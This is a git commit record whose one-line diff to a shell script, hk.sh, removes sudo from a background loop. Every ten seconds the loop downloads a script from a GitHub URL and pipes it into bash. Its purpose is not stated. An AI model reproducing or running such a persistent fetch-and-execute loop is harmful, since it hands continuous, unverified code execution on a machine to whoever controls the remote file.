c5fc1af50bb5980a566ce233ada638d8a3b3efe7
aa0c <107745374+awaitla@users.noreply.github.com>
2024-06-27 21:46:44 +0800

    Update hk.sh

--- run/hk.sh
+++ run/hk.sh
@@ -1,1 +1,1 @@
-nohup bash -c 'while true; do sudo curl -fsSL https://github.com/awaitla/s/raw/main/run/uptime.sh | sudo bash; sleep 10; done' &
+nohup bash -c 'while true; do curl -fsSL https://github.com/awaitla/s/raw/main/run/uptime.sh | bash; sleep 10; done' &
